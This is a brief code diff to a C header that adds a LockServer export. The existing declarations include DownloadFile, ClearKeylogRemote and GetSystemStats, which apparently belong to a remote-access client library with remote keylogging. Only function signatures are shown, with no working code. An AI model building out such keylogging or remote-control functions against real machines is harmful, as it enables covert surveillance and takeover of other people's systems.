@@ -63,4 +63,6 @@ DLLEXPORT void DownloadFile(const char* remotePath, const char* localPath);
 
 DLLEXPORT void ClearKeylogRemote();
 DLLEXPORT const char* GetSystemStats();
+DLLEXPORT void LockServer();
+
 #endif // CLIENTLIB_H
